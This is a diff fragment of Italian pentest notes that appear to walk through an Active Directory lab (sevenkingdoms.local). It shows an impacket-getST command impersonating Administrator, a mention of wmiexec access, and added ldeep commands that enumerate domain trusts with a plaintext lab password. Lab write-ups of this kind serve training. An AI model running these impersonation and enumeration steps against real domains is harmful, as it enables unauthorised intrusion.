@@ -52,3 +52,10 @@ impacket-getST -spn 'cifs/kingslanding.sevenkingdoms.local' -impersonate Adminis
 ```
 ![[Pasted image 20230911115059.png]]
 ed accedere con wmiexec
+### **ACL**
+### **TRUST ENUM**
+Incominciamo enumerando i trust:
+```bash
+ldeep ldap -u tywin.lannister -p 'powerkingftw135' -d sevenkingdoms.local -s ldap://192.168.56.10 trusts
+ldeep ldap -u tywin.lannister -p 'powerkingftw135' -d sevenkingdoms.local -s ldap://192.168.56.12 trusts
+```
